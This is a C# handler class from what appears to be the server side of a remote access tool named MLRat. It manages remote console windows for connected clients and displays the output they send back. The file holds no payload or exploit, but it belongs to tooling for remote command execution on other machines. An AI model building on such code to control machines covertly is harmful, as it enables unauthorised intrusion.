using MLManagementServer.Forms;
using MLRat.Server;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace MLManagementServer.Handlers
{
    public static class ConsoleHandler
    {
        static Dictionary<Guid, formConsole> FormHandler = new Dictionary<Guid, formConsole>();
        public static void Handle(IClient c, object[] data)
        {
            ConsoleCommand command = (ConsoleCommand)data[1];
            if (command == ConsoleCommand.Responce) DisplayResponce(c, (string)data[2]);
        }

        public static void Disconnect(IClient c)
        {
            if(FormHandler.ContainsKey(c.ID))
            {
                FormHandler[c.ID].Close();
            }
        }

        public static void Start(IClient c)
        {
            if (!FormHandler.ContainsKey(c.ID))
            {
                formConsole form = new formConsole(c);
                form.FormClosed += Form_FormClosed;
                FormHandler.Add(c.ID, form);
                form.Show();
            }
        }

        private static void Form_FormClosed(object sender, System.Windows.Forms.FormClosedEventArgs e)
        {
            formConsole form = (formConsole)sender;
            if (FormHandler.ContainsKey(form.Client.ID))
            {
                FormHandler.Remove(form.Client.ID);
            }
            form.Dispose();
        }

        public static void ContextCallback(IClient[] clients)
        {
            foreach (IClient c in clients)
                Start(c);

        }

        static void DisplayResponce(IClient c, string message)
        {
            if(FormHandler.ContainsKey(c.ID))
            {
                FormHandler[c.ID].AddLine(message);
            }
        }
    }
}
